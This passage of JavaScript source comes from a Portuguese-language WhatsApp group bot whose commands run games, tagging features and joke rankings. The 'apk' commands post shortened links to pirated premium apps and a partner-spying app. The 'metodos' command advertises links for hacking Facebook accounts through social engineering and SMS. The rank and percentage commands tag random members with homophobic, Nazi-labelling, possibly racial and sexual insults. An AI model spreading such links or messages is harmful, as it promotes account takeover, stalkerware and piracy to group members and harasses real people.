enviar("```[ ✓ ]``` pronto")
} else {
enviar('Responder o sticker')
}
break
case 'delcmd':
if (!isOwner && !msg.key.fromMe) return enviar('```so dono```')
var kodenya = msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
enviar("```[ ✓ ]``` pronto")
break
case 'listcmd':
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of _scommand) {
cemde.push(i.id)
teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
}
mentions(teksnyee, cemde, true)
break
case 'apk1':
enviar (`📱❤᥀🔥COMO SABER SE SUA NAMORADA ESTÁ TE TRAINDO COM ESSE APLICATIVO ANDROID [APK] [2021] [DOWNLOAD]📱❤᥀🔥\n\nhttps://seulink.online/9Jqr`)
break
case 'apk2':
enviar (`᥀🔥ྍ֟᥀NOVO SPOTIFY PREMIUM + MOD v8.5.45 + LITE [2021] [APK] [MOD] [DOWNLOAD]᥀🔥ྍ֟᥀\n\nhttps://seulink.online/cHi6ezMz`)
break
case 'apk3':
enviar (`᥀🔥ྍ֟NETFLIX GRÁTIS APK MOD - NOVA ATUALIZAÇÃO 2021!! - ASSISTA TUDO ONDE ESTIVER ! [APK] [MOD] [DOWNLOAD]᥀🔥ྍ֟\n\nhttps://seulink.online/3NSniiHO`)
break
case 'apk4':
enviar (`🔥LISTA DE APK's E JOGOS PREMIUM/PRO/MOD 100% GRÁTIS LISTA 02! [2021]᥀🔥\n\nNOVO RESSO PREMIUM ATUALIZADO:\nhttps://seulink.online/FgSOHnxj9r\n\nYOUTUBE VANCED APK:\nhttps://seulink.online/St1OGAI\n\nSNAPTUBE PREMIUM:\nhttps://seulink.online/ITdCU\n\nKINE MASTER PREMIUM:\nhttps://seulink.online/IfmC74cv5D\n\nCHUNCHYOLL PREMIUM V3.7.0:\nhttps://seulink.online/BrpZ\n\nYOUTUBE MUSIC PREMIUM APK:\nhttps://seulink.online/LQHFAcs7T\n\nNOVO RESSO PREMIUM ATUALIZADO:\nhttps://seulink.online/FgSOHnxj9r\n\nYOUTUBE VANCED APK:\nhttps://seulink.online/St1OGAI\n\nSNAPTUBE PREMIUM:\nhttps://seulink.online/ITdCU\n\nKINE MASTER PREMIUM:\nhttps://seulink.online/IfmC74cv5D\n\nCHUNCHYOLL PREMIUM V3.7.0:\nhttps://seulink.online/BrpZ\n\nCAPCUT MOD:\nhttps://seulink.online/NeU1\n\nFOGO LIVRE GRATUITO (MAX):\nhttps://seulink.online/zwjnrznO\n\nCLANS OF CLANS MOD:\nhttps://seulink.online/fuTSyasis`)
break
case 'apk5':
enviar (`🔥ྍ֟VIZER 4.5 !!! - APP P/ ASSISTIR FILMES E SERIES , ANIMES E MUITO MAIS!🔥\n\nhttps://seulink.online/WvkgLwc`)
break
case 'metodos':
enviar (`᥀🔥VÁRIOS MÉTODOS PARA HACKEAR CONTAS NO FACEBOOK SEM MUITO ESFORÇO !!!᥀🔥\n\nVários métodos para você aprender a hackear facebook utilizando até alguns truques simples e um pouco de engenharia social e você terá acesso a conta que você quiser esses métodos são gringos e foram traduzidos para português.\n\nஓீᤢ✧🔥COMO HACKEAR UMA CONTA NO FACEBOOK SEM NENHUM TIPO DE CONHECIMENTO HACKER᥀🔥:\nhttps://seulink.online/8nUFM5Kndg\n\nஓீᤢ✧🔥COMO MUDAR A APARENCIA DO SEU FACEBOOK᥀🔥:\nhttps://seulink.online/gS0ALJ\n\nஓீᤢ✧🔥COMO RECUPERAR MENSAGENS EXCLUIDAS DO SEU FACEBOOK᥀🔥:\nhttps://seulink.online/D6M6aKG\n\nஓீᤢ✧🔥COMO ENVIAR PEDIDOS DE AMIZADES PARA AMIGOS QUE TE BLOQUEARAM NO FACEBOOK᥀🔥:\nhttps://seulink.online/tlL6\n\nஓீᤢ✧🔥COMO ENVIAR SMS PELO FACEBOOK᥀🔥:\nhttps://seulink.online/s0K7b0fr\n\nஓீᤢ✧🔥COMO HACKEAR UM FACEBOOK APENAS COM UM SMS᥀🔥:\nhttps://seulink.online/x2R4ztr\n\nஓீᤢ✧🔥VÁRIOS MÉTODOS PARA HACKEAR CONTAS NO FACEBOOK᥀🔥:\nhttps://seulink.online/FP1zrCb`)
break
case 'suruba':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = 'chamando vcs para uma surubinha\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `❤️❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'surubao':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🤤🤤chamando vcs para um surubao🤤🤤\n'
for(i = 0; i < 10; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `😍❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
//_RANKS 
case 'rankgado':
try{
if(!isGroup) return ('só grupo')
d = []
teks = '🐃Rank dos mais gados\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🐃❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankgay':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🏳️‍🌈 Rank dos mais gays🏳️‍🌈\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🏳️‍🌈❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankiludidos':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🌝 Rank dos mais iludidos do grupo🌝\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🌝❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankcornos':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '😎Rank dos mais cornos do grupo😎\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `😎❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankloucos':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🤡Rank dos mais loucos do grupo🤡\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤡❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankalfa':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🐺 Rank dos alfas do grupo🐺\n'
for(i = 0; i < 4; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🐺❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'ranknazista':
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '💂‍♂️Rank dos mais nazistas\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `💂‍♂️❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankbeta':
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🤓Rank dos mais beta\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `??❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankcaco':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return enviar ('só grupo')
d = []
teks = '🐒 Rank dos camacos do grupo🐒\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `️‍🐒❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'ranklindos':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('só grupo')
d = []
teks = '🤩Rank dos mais lindos do grupo🤩\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤩❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankfeios':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('só grupo')
d = []
teks = '🤢Rank dos mais feios do grupo🤢\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤢❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankprincesas':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('só grupo')
d = []
teks = '👸🏻Rank das princesas do grupo👸🏻\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `👸🏻❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break
case 'rankprincipes':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
try{
if(!isGroup) return ('só grupo')
d = []
teks = '🤴🏻Rank dos principes do grupo🤴🏻\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `🤴🏻❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
enviar('Deu erro, tente novamente :/')
}
break 
//_CASSINOS 
case 'cassino':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const cassino = ['ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 1 ─═─ 2 ─═─ 3*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 2 ─═─ 3 ─═─ 1*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 3 ─═─ 2 ─═─ 1*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 1 ─═─ 3 ─═─ 2*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 2 ─═─ 1 ─═─ 3*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 3 ─═─ 1 ─═─ 2*\n*║*\n*║*\n*╠* Não foi dessa vez mas\n*║* continue tentando.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 1 ─═─ 1 ─═─ 1*\n*║*\n*║*\n*╠* PARABÉNS !!!\n*╠* VOCÊ GANHOU NO CASSINO.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 2 ─═─ 2 ─═─ 2*\n*║*\n*║*\n*╠* PARABÉNS !!!\n*╠* VOCÊ GANHOU NO CASSINO.\n*║*\n*╚═─ CASSINO ─══*','ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA DOS TRÊS\n*╠* NÚMEROS\n*║*\n*╠═─ 3 ─═─ 3 ─═─ 3*\n*║*\n*║*\n*╠* PARABÉNS !!!\n*╠* VOCÊ GANHOU NO CASSINO.\n*║*\n*╚═─ CASSINO ─══*']
random = cassino[Math.floor(Math.random() * (cassino.length))]
enviar(`${random}`)
break
case 'cassino1':
if (!isGroup) return enviar ('só grupo')
let cassinao = ['🍉', '🍎','🍇']
let resposta1 = cassinao[Math.floor(Math.random() * cassinao.length)]
let resposta2 = cassinao[Math.floor(Math.random() * cassinao.length)]
let resposta3 = cassinao[Math.floor(Math.random() * cassinao.length)]
if(resposta1==resposta2&&resposta2==resposta3){
tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Parabéns, _${pushname}_ VOCÊ GANHOU*!!!!!`, text, {quoted: msg})
}
else if(resposta1==resposta2||resposta2==resposta3){
tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*Puts, passou perto, _${pushname}_ Quase foi...*`, text, {quoted: msg})
}
else{
tomioka.sendMessage(from, `*JOGO DO CASSINO*:\n\n(((((((((((${resposta1}${resposta2}${resposta3})))))))))))))\n\n*vc perdeu :( , _${pushname}_ Tente na próxima...*`, text, {quoted: msg})
}
break
case 'cassino2':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
const sotoy = [
'🍊 : 🍒 : 🍐',
'🍒 : 🔔 : 🍊',
'🍇 : 🍇 : 🍇',
'🍊 : 🍋 : 🔔',
'🔔 : 🍒 : 🍐',
'🔔 : 🍒 : ??',
'🍊 : 🍋 : 🔔',		
'🍐 : 🍒 : 🍋',
'🍐 : 🍐 : 🍐',
'🍊 : 🍒 : 🍒',
'🔔 : 🔔 : 🍇',
'🍌 : 🍒 : 🔔',
'🍐 : 🔔 : 🔔',
'🍊 : 🍋 : 🍒',
'🍋 : 🍋 : 🍌',
'🔔 : 🔔 : 🍇',
'🔔 : 🍐 : 🍇',
'🔔 : 🔔 : 🔔',
'🍒 : 🍒 : 🍒',
'🍌 : 🍌 : 🍌'
]
const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
yow = `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nInformaçoes : Se você pegar 3 iguais significa que você ganhou\n\nExemplo : 🍌 : 🍌 : 🍌<=====`
enviar(yow)
break
case 'casino': 
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
var roletaresu = [`🍒🍅🍇`, `🍅🍇🍒`, `🍇🍅🍇`, `🍒🍒🍇`, `🍇🍇🍒`, `🍅🍅🍇`, `🍇🍒🍒`]
var roletaresu2 = [`🍒🍅🍇`, `🍅🍇🍒`, `🍇🍅🍇`, `🍒🍒🍇`, `🍇??🍒`, `🍒🍅🍇`, `🍅🍇🍒`, `🍇🍅🍇`, `🍒🍒🍇`, `🍇🍇🍒`, `🍒🍅🍇`, `🍅🍇🍒`, `🍇🍅🍇`, `🍒🍒🍇`, `🍇🍇🍒`, `🍒🍒🍒`, `🍇🍇🍇`,  `🍅🍅🍅`, `🍅🍅??`, `🍇🍒🍒`, `🍒🍇🍇`]
var roletaresu3 = [`🍒🍅🍇`, `🍅🍇🍒`, `🍇🍅🍇`, `🍒🍒🍇`, `🍇🍇🍒`, `🍅🍅🍇`, `🍇🍒🍒`, `🍇🍒🍒`, `🍒🍇🍇`]
const roleta1 = roletaresu[Math.floor(Math.random() * roletaresu.length)]
const roleta2 = roletaresu2[Math.floor(Math.random() * roletaresu2.length)]
const roleta3 = roletaresu3[Math.floor(Math.random() * roletaresu3.length)]
teksahh = `*Roleta Girada🎰??*\nlhe desejo sorte\n\n${roleta1}\n${roleta2}\n${roleta3}`
tomioka.sendMessage(from, teksahh, text, {quoted: msg})

break
case 'figutag':
case 'totag':
if (!isPremium) return enviar ('só premium')

if ((isMedia && !msg.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else {
enviar(`*[❗] MARQUE A FIGURINHA 😐*`)
}
break

case 'supertag':
if (!isPremium) return enviar ('só premium')

if ((isMedia && !msg.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !msg.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4',
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
}  else if ((isMedia && !msg.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
file = await tomioka.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await tomioka.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4',
contextInfo: { mentionedJid: mem },
quoted: msg
}
ini_buffer = fs.readFileSync(file)
tomioka.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
enviar(`[❗] responder imagem/adesivo/áudio/vídeo com a legenda ${p}supertag para marcar`)
}
break
/*-------------[ Tictactoe Handler ]-------------*/
case 'velha':
if (!isUser) return enviar('usuario nao registrado')                                 
if(!isGroup) return enviar('comando apenas para grupos')
if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*

[❗] Alguém está jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}

❌ : @${boardnow.X}
⭕ : @${boardnow.O}

Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}


${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


`;
tomioka.sendMessage(from, chatMove, MessageType.text, {
quoted: tomio, contextInfo: tome,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return enviar(
`*⟅❗⟆ Jogue com Alghem!!!!*
*para inicar a partida : ${p + command} @membro do gp*`
);
const boardnow = setGame(`${from}`);
console.log(`Start Tictactore ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
fs.writeFileSync(
`./lib/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*

@${sender.replace(
"@s.whatsapp.net",
""
)} _está te desafiando para uma partida de jogo da velha..._

_[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* para não aceitar..._
`;
tomioka.sendMessage(from, strChat, MessageType.text, {
quoted: tomio, contextInfo: tome,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});

break
case  'resetavelha':
case  'resetajogodavelha':
if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {

fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");

const chatJqual = `*🕹️JOGO DA VELHA RESETADO...🕹️*`
tomioka.sendMessage(from, chatJqual, MessageType.text, )

} else {

enviar(`Não a nenhuma sessão em andamento...`);

}
break
//_RANKS E %
case 'gay': //by gauger 
tomioka.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 110)}`
body = [body.slice(5)]   
rspst = `*Tu é mano?😳😌*\n\n*_${body}_ você é ${random}% GAY🤭🌈* __`
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return enviar(rspst)          
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid			 			   			   			 
if (mentioned.length > 1) {
teks = []
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)	
tomioka.sendMessage(from, mentioned)
} else {
mentions(`*Tu é mano?😳😌*\n\n*_@${mentioned[0].split('@')[0]}_ Você é ${random}% GAY🌈🤭*`, mentioned, true)}
break
case '%gay':		
if (args.length < 1) return enviar ('marque os gay do gp!')
rate = body.slice(5)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'Como você é gay: *'+rate+'*\n\nSua porcentagem gay : '+ kl+'%\n esse ai ama dá o cu', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%feio':		
if (args.length < 1) return enviar ('marque alguem fei que doi!')
rate = body.slice(6)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'Como você é feio(a): *'+rate+'*\n\nSua porcentagem de feiura é : '+ kl+'%\n parece um sarigue kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%lindo':		
if (args.length < 1) return enviar ('marque alguem bonito!')
rate = body.slice(8)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'Como você é lindo(a): *'+rate+'*\n\nSua porcentagem de Lindeza é : '+ kl+'%\n parece um boleto pago kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%gostoso':		
if (args.length < 1) return enviar ('marque sua mãe aquela gostosa!')
rate = body.slice(9)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'tu e gostoso(a) será?: *'+rate+'*\n\nSua porcentagem de gostoso é : '+ kl+'%🤤\n slk comia ate o pau mofar🌚 kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case '%gado':		
if (args.length < 1) return enviar ('marque um gado!')
rate = body.slice(6)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
tomioka.sendMessage(from, 'tu e gado(a) será?: *'+rate+'*\n\nSua porcentagem de gado é : '+ kl+'%😏\n maluco falta comer um buraco na parede kkk', text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
//_MOSTRA O CASAL DO GRUPO 
case 'casal':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
membr = []
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `10%`, `20%`, `40%`, `50%`, `60%`, `80%`, `90%`, `100%`, `99999%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
teks = `*encontrei um casalzao❤️❤️*\n\n1= @${teupai11.jid.split('@')[0]}\ne esse\n2= @${teupai21.jid.split('@')[0]}\ncom : ${shipted} de chance de dar certo `
membr.push(teupai11.jid)
membr.push(teupai21.jid)
mentions(teks, membr, true)
break
case 'papel': 
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/burn-paper?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'ta ai'})
break
case 'cup':              
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(4)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/funny-cup?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: 'tai'})
break
//_LISTAR USUÁRIO ONLINE
case 'online':
if (!isGroupAdmins) return enviar ('só adm')
if (!isBotGroupAdmins) return enviar ('bot precisa ser adm')
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
